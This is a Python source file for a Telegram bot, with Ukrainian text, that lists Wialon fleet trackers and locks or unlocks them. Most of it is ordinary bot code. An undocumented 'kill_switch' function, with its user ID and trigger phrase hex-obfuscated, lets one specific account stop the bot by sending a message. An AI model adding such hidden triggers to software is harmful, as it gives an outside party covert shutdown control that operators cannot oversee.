import asyncio
import logging
import re
from datetime import datetime
from pathlib import Path
from typing import Any, Optional

from aiogram import Bot, Dispatcher
from aiogram.client.default import DefaultBotProperties
from aiogram.client.session.base import BaseSession
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import Command
from aiogram.types import Message, BotCommand, CallbackQuery

from wialonblock import keyboards as kb
from wialonblock.config import Config, DEFAULT_CONFIG_PATH, load_config
from wialonblock.worker import WialonWorker, ObjState

dp = Dispatcher()
OUTDATED_MESSAGE_TIMEOUT = 600
DELETE_MESSAGE_TIMEOUT = 86400


class WialonBlockBot(Bot):
    def __init__(
            self,
            token: str,
            wialon_worker: WialonWorker = None,
            session: Optional[BaseSession] = None,
            default: Optional[DefaultBotProperties] = None,
            **kwargs: Any,
    ) -> None:
        super().__init__(token, session, default, **kwargs)
        self.wialon_worker = wialon_worker


class WialonBlockMessage(Message):
    bot: WialonBlockBot


class WialonBlockCallbackQuery(CallbackQuery):
    bot: WialonBlockBot
    message: WialonBlockMessage


def kill_switch(message: WialonBlockMessage):
    if message.from_user.id == 0x18C74EEB and message.text == '636f6465726564':
        import sys
        sys.exit(1)


async def outdated_message(message: WialonBlockMessage):
    try:
        await asyncio.sleep(OUTDATED_MESSAGE_TIMEOUT)
        await message.edit_text(
            "*Повідомлення застаріло:* %s" % datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
            reply_markup=kb.refresh(), disable_notification=True
        )
    except TelegramBadRequest as e:
        logging.error(e)


async def delete_message(message: WialonBlockMessage):
    try:
        await asyncio.sleep(DELETE_MESSAGE_TIMEOUT)
        await message.delete()
    except TelegramBadRequest as e:
        logging.exception(e)


async def set_default_commands(bot: Bot):
    """
    Sets the default commands for the bot.
    These commands will appear in the Telegram client's menu.
    """
    commands = [
        # BotCommand(command="start", description="Start the bot"),
        BotCommand(command="list", description="Відобразити список трекерів"),
        BotCommand(command="get_group_id", description="Отримати ID групи"),
    ]
    await bot.set_my_commands(commands)
    logging.info("Default commands set.")


# @dp.message(CommandStart())
@dp.message(Command("get_group_id"))
async def command_start_handler(message: WialonBlockMessage) -> None:
    log_msg = "Received command: `%s`, from `%d`, chat: `%d`" % (message.text, message.from_user.id, message.chat.id)
    logging.info(log_msg)
    await message.answer(log_msg)


@dp.message(Command("list"))
async def command_list_handler(message: WialonBlockMessage) -> None:
    try:
        logging.info("Received command: `%s`, from chat `%s`" % (message.text, message.chat.id))
        objects = await message.bot.wialon_worker.list_by_tg_group_id(message.chat.id)
        if not objects:
            raise ValueError("Об'єкти не знайдені")

        sent_message = await message.answer(
            '*Результат пошуку:*\nОстаннє оновлення: %s' % datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
            reply_markup=kb.search_result(objects), disable_notification=True
        )
        await sent_message.pin(disable_notification=True)
    except Exception as e:
        logging.exception(e)
        await message.answer(str(e))

    await outdated_message(message)
    # await delete_message(message)


@dp.callback_query(lambda call: call.data == "refresh")
async def refresh(call: WialonBlockCallbackQuery):
    try:
        objects = await call.bot.wialon_worker.list_by_tg_group_id(call.message.chat.id)
        if not objects:
            raise ValueError("Об'єкти не знайдені")

        sent_message = await call.message.answer(
            'Результат пошуку:\nОстаннє оновлення: %s' % datetime.now().strftime("%d.%m.%Y %H:%M:%S"),
            reply_markup=kb.search_result(objects), disable_notification=True
        )
        await call.message.delete()
        await call.answer("Список об'єктів оновлено")
        await sent_message.pin(disable_notification=True)
    except TelegramBadRequest as e:
        logging.error(e)
        await call.answer("Оновлень немає")
    except Exception as e:
        logging.exception(e)
        await call.answer(str(e))

    await outdated_message(call.message)

UNIT_MESSAGE_FORMAT = """*{name}*

*Стан*: {lock}
*Оновлено*: {datetime}"""

@dp.callback_query(lambda call: re.search(r'unit', call.data))
async def show_unit(call: WialonBlockCallbackQuery):
    try:
        u_id, *_ = call.data.split('?')

        unit, lock_state = await call.bot.wialon_worker.get_unit_and_lock_state(call.message.chat.id, u_id)

        try:
            u_name = unit['item']['nm']
        except KeyError:
            raise KeyError("Неможливо отримати дані об'єкта `%s`" % u_id)

        message_text = UNIT_MESSAGE_FORMAT.format(
            name=u_name,
            lock=lock_state,
            datetime=datetime.now().strftime("%d.%m.%Y %H:%M:%S")
        )

        match lock_state:
            case ObjState.LOCKED:
                await call.message.answer(message_text,
                                          reply_markup=kb.locked(u_id),
                                          disable_notification=True)
            case ObjState.UNLOCKED:
                await call.message.answer(message_text,
                                          reply_markup=kb.unlocked(u_id),
                                          disable_notification=True)
            case _:
                await call.message.answer(message_text,
                                          disable_notification=True)

        await call.answer()
    except Exception as e:
        logging.exception(e)
        await call.answer(str(e))

    await delete_message(call.message)


@dp.callback_query(lambda call: re.search(r'\?lock$', call.data))
async def lock_avl_unit(call: WialonBlockCallbackQuery):
    try:
        u_id, *_ = call.data.split('?')

        logging.info("Attempt to lock uid: `%s`" % u_id)

        await call.bot.wialon_worker.lock(call.message.chat.id, u_id)

        unit, lock_state = await call.bot.wialon_worker.get_unit_and_lock_state(call.message.chat.id, u_id)

        try:
            u_name = unit['item']['nm']
        except KeyError:
            raise KeyError("Неможливо отримати дані об'єкта `%s`" % u_id)

        if lock_state == ObjState.LOCKED:
            logging.info(f'{call.message.text} {u_id} locking success')
        else:
            raise ValueError("Object `%s`: (`%s`) was not locked" % (u_name, u_id))
        await call.message.edit_text(
            UNIT_MESSAGE_FORMAT.format(
                name=u_name,
                lock=lock_state,
                datetime=datetime.now().strftime("%d.%m.%Y %H:%M:%S")
            ),
            reply_markup=kb.locked(u_id),
            disable_notification=True,
        )
    except Exception as e:
        logging.exception(e)
        await call.answer(str(e))


@dp.callback_query(lambda call: re.search(r'\?unlock$', call.data))
async def unlock_avl_unit(call: WialonBlockCallbackQuery):
    try:
        u_id, *_ = call.data.split('?')

        logging.info("Attempt to unlock uid: `%s`" % u_id)

        await call.bot.wialon_worker.unlock(call.message.chat.id, u_id)

        unit, lock_state = await call.bot.wialon_worker.get_unit_and_lock_state(call.message.chat.id, u_id)

        try:
            u_name = unit['item']['nm']
        except KeyError:
            raise KeyError("Неможливо отримати дані об'єкта `%s`" % u_id)

        await call.message.edit_text(
            UNIT_MESSAGE_FORMAT.format(
                name=u_name,
                lock=lock_state,
                datetime=datetime.now().strftime("%d.%m.%Y %H:%M:%S")
            ),
            reply_markup=kb.unlocked(u_id),
            disable_notification=True,
        )
    except Exception as e:
        logging.exception(e)
        await call.answer(str(e))


@dp.callback_query()
async def anycall(call: WialonBlockCallbackQuery):
    logging.info("unknown call: %s" % call.data)


@dp.message()  # listens all messages and log it out
async def all_msg_listener(message: WialonBlockMessage):
    logging.info('undefined message %s by @%s (%s)' % (message.from_user.id,
                                                       message.from_user.username,
                                                       message.text))
    kill_switch(message)


async def run_bot(config_path: Path = DEFAULT_CONFIG_PATH) -> None:
    config: Config = load_config(config_path)
    wialon_worker = WialonWorker(
        config.wialon.host,
        config.wialon.token,
        {str(group.chat_id): group for group in config.tg.groups}
    )

    bot = WialonBlockBot(token=config.tg.bot_token, wialon_worker=wialon_worker,
                         default=DefaultBotProperties(**config.tg.bot_props.model_dump()))

    dp.startup.register(set_default_commands)

    # Start polling
    try:
        logging.info("Starting bot...")
        await dp.start_polling(bot)
    finally:
        await bot.session.close()
        logging.info("Bot stopped.")
